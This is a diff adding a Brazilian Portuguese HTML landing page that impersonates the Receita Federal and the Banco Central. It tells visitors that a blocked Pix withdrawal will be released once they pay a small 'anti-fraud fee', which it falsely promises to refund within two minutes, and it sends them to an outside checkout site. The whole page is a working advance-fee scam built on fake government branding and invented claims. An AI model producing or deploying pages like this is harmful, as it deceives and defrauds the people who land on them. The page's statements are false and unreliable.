@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="js/utm-handler.js" data-token="7a394605-1983-4c36-98cc-7194d19aa9b4" data-click-id-param="click_id">
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Taxa Anti-Fraude</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+        background: linear-gradient(135deg, #0963a8 0%, #064a7a 100%);
+        min-height: 100vh;
+        color: #333;
+        line-height: 1.5;
+        overflow-x: hidden;
+        padding: 0;
+      }
+
+      /* Header simples e limpo */
+      header {
+        background: white;
+        border-bottom: 2px solid #0963a8;
+        padding: 15px 0;
+        text-align: center;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      header img {
+        width: 160px;
+        height: auto;
+        vertical-align: middle;
+      }
+
+      /* Container principal mobile */
+      .container {
+        max-width: 100%;
+        margin: 0 auto;
+        padding: 20px 15px;
+      }
+
+      /* Card principal */
+      .content {
+        background: white;
+        border-radius: 16px;
+        padding: 30px 25px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .content::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          45deg,
+          transparent,
+          rgba(9, 99, 168, 0.03),
+          transparent
+        );
+        animation: shine 4s infinite;
+      }
+
+      @keyframes shine {
+        0% {
+          transform: translateX(-100%) translateY(-100%) rotate(45deg);
+        }
+        100% {
+          transform: translateX(100%) translateY(100%) rotate(45deg);
+        }
+      }
+
+      /* Logo PIX */
+      .pix-logo {
+        width: 80px;
+        height: auto;
+        margin: 0 0 20px 0;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Título principal */
+      .main-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #0963a8;
+        margin-bottom: 25px;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Texto explicativo */
+      .explanation-text {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 20px;
+        color: #333;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Destaque para elementos importantes */
+      .highlight {
+        color: #0963a8;
+        font-weight: 600;
+      }
+
+      .strong-highlight {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        padding: 2px 8px;
+        border-radius: 6px;
+        font-weight: 600;
+      }
+
+      /* Card da tarifa */
+      .tariff-card {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        padding: 20px;
+        border-radius: 12px;
+        margin: 25px 0;
+        box-shadow: 0 6px 20px rgba(9, 99, 168, 0.3);
+        position: relative;
+        z-index: 1;
+      }
+
+      .tariff-label {
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 8px;
+        opacity: 0.95;
+      }
+
+      .tariff-value {
+        font-size: 28px;
+        font-weight: 700;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+      }
+
+      /* Informação de extorno */
+      .refund-info {
+        background: rgba(9, 99, 168, 0.1);
+        border: 2px solid rgba(9, 99, 168, 0.2);
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        font-size: 14px;
+        color: #0963a8;
+        font-weight: 500;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Botão CTA mobile otimizado */
+      .cta-button {
+        display: inline-block;
+        width: 100%;
+        max-width: 350px;
+        margin: 25px 0;
+        padding: 18px 25px;
+        font-size: 16px;
+        font-weight: 700;
+        color: white;
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        border: none;
+        border-radius: 50px;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 25px rgba(9, 99, 168, 0.4);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        position: relative;
+        overflow: hidden;
+        animation: pulse-cta 2.5s infinite;
+        touch-action: manipulation;
+        -webkit-appearance: none;
+        z-index: 1;
+      }
+
+      @keyframes pulse-cta {
+        0%,
+        100% {
+          transform: scale(1);
+          box-shadow: 0 8px 25px rgba(9, 99, 168, 0.4);
+        }
+        50% {
+          transform: scale(1.02);
+          box-shadow: 0 10px 30px rgba(9, 99, 168, 0.6);
+        }
+      }
+
+      .cta-button:active {
+        transform: scale(0.98);
+        transition: transform 0.1s;
+      }
+
+      .cta-button::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        transition: left 0.5s;
+      }
+
+      .cta-button:active::before {
+        left: 100%;
+      }
+
+      /* Badges de segurança */
+      .security-badges {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 20px 0;
+        flex-wrap: wrap;
+        position: relative;
+        z-index: 1;
+      }
+
+      .security-badge {
+        background: rgba(9, 99, 168, 0.1);
+        color: #0963a8;
+        padding: 6px 12px;
+        border-radius: 15px;
+        font-size: 11px;
+        font-weight: 600;
+        border: 1px solid rgba(9, 99, 168, 0.2);
+      }
+
+      /* Footer simples */
+      footer {
+        text-align: center;
+        padding: 20px;
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      /* Ajustes específicos para mobile */
+      @media (max-width: 480px) {
+        .container {
+          padding: 15px 10px;
+        }
+
+        .content {
+          padding: 25px 20px;
+          border-radius: 14px;
+        }
+
+        header img {
+          width: 140px;
+        }
+
+        .main-title {
+          font-size: 20px;
+        }
+
+        .explanation-text {
+          font-size: 15px;
+        }
+
+        .tariff-value {
+          font-size: 24px;
+        }
+
+        .cta-button {
+          padding: 16px 20px;
+          font-size: 15px;
+        }
+
+        .security-badges {
+          gap: 8px;
+        }
+
+        .security-badge {
+          font-size: 10px;
+          padding: 5px 10px;
+        }
+      }
+
+      /* Otimizações de performance mobile */
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
+        }
+      }
+
+      /* Ajustes para iOS */
+      @supports (-webkit-touch-callout: none) {
+        .cta-button {
+          -webkit-appearance: none;
+          -webkit-tap-highlight-color: transparent;
+        }
+      }
+    </style>
+
+<script src="js/utm-handler.js" data-token="7a394605-1983-4c36-98cc-7194d19aa9b4" data-click-id-param="click_id">
+</script>
+</head>
+
+  <body>
+    <!-- Header limpo -->
+    <header>
+      <img src="images/receita-federal-logo.png" alt="Receita Federal">
+    </header>
+
+    <div class="container">
+      <!-- Card principal -->
+      <div class="content">
+        <!-- Logo PIX -->
+        <img src="images/logo-pix-icone-1024.png" alt="Logo Pix" class="pix-logo">
+
+        <!-- Título principal -->
+        <h2 class="main-title">Seu saque foi APROVADO!</h2>
+
+        <!-- Explicação principal -->
+        <p class="explanation-text">
+          <strong>Seu saldo foi enviado</strong>, mas a transferência foi
+          interrompida pelo
+          <span class="highlight">Banco Central do Brasil</span>.
+        </p>
+
+        <p class="explanation-text">
+          Para garantir a segurança e evitar fraudes, é necessário pagar uma
+        </p>
+        <span class="strong-highlight">tarifa simbólica anti-fraude.</span>
+        <!-- Informação de extorno -->
+        <link rel="stylesheet" href="css/all.min.css">
+
+        <div class="refund-info">
+  <i class="fas fa-clock" aria-hidden="true" style="color: #0963a8; margin-right: 6px;"></i>
+  Este valor será <strong>REEMBOLSADO</strong> em até 2 minutos após o pagamento.
+</div>
+
+
+
+
+        <!-- Card da tarifa -->
+        <div class="tariff-card">
+          <div class="tariff-label">Valor da tarifa:</div>
+          <div class="tariff-value">R$ 16,57</div>
+        </div>
+
+        <!-- Botão CTA -->
+        <a href="https://pay.confirmapagamento.site/checkout/4d1555d6-74f2-464f-bcf9-97ac3125db68" class="cta-button" onclick="preserveParams(event)">
+          Pagar Tarifa e Desbloquear Saldo
+        </a>
+      </div>
+    </div>
+
+    <!-- Footer simples -->
+    <footer>
+      <p>© 2025 Pagamento Seguro. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+      function preserveParams(event) {
+        event.preventDefault(); // Evitar o redirecionamento padrão
+
+        // URL base do link
+        const baseUrl = new URL(event.currentTarget.href);
+
+        // Capturar parâmetros da URL atual
+        const currentParams = new URLSearchParams(window.location.search);
+
+        // Adicionar parâmetros da URL atual ao link, sem duplicar
+        for (const [key, value] of currentParams) {
+          if (!baseUrl.searchParams.has(key)) {
+            baseUrl.searchParams.append(key, value);
+          }
+        }
+
+        // Redirecionar com os parâmetros preservados
+        window.location.href = baseUrl.toString();
+      }
+    </script>
+  
+
+</body></html>
